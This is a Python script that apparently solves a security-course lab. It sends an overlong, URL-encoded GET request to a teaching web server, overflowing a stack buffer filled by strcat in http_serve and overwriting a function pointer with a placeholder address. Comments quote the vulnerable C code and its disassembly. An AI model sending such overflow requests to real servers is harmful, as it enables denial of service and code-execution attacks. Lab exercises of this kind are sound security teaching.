#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

def build_exploit():
    ## http.c: http_serve.c
    ##  Disassembler:
    ##   0x08049513 <+0>:     push   %ebp
    ##   0x08049514 <+1>:     mov    %esp,%ebp
    ##   0x08049516 <+3>:     sub    $0x478,%esp
    ##   0x0804951c <+9>:     movl   $0x80495ea,-0xc(%ebp)
    ##   0x08049523 <+16>:    movl   $0x400,0x4(%esp)
    ##   0x0804952b <+24>:    lea    -0x40c(%ebp),%eax
    ##   0x08049531 <+30>:    mov    %eax,(%esp)
    ##   0x08049534 <+33>:    call   0x8048930 <getcwd@plt>
    ##   0x08049539 <+38>:    movl   $0x1,0x8(%esp)
    ##   0x08049541 <+46>:    lea    -0x40c(%ebp),%eax
    ##   0x08049547 <+52>:    mov    %eax,0x4(%esp)
    ##   0x0804954b <+56>:    movl   $0x804a30c,(%esp)
    ##   0x08049552 <+63>:    call   0x8048950 <setenv@plt>
    ##   0x08049557 <+68>:    mov    0xc(%ebp),%eax
    ##   0x0804955a <+71>:    mov    %eax,0x4(%esp)
    ##   0x0804955e <+75>:    lea    -0x40c(%ebp),%eax
    ##   0x08049564 <+81>:    mov    %eax,(%esp)
    ##   0x08049567 <+84>:    call   0x8048880 <strcat@plt>
    ##
    ##  C:
    ##   http_serve(int fd, const char *name)
    ##   {
    ##       void (*handler)(int, const char *) = http_serve_none; // 0xbfffddfc
    ##       char pn[1024]; // 0xbfffd9fc
    ##       struct stat st;
    ## 
    ##       getcwd(pn, sizeof(pn));
    ##       setenv("DOCUMENT_ROOT", pn, 1);
    ## 
    ##       strcat(pn, name);

    ## pn = "/home/httpd/lab" + name

    handle_addr = 0xbfffddfc
    pn_addr = 0xbfffd9fc

    bad_url = '/' + ('a' * (handle_addr - pn_addr - len("/home/httpd/lab") - 1))
    bad_url += struct.pack("<I", 0x12345678)
    req =   "GET " + urllib.quote(bad_url) + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    req = build_exploit()
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

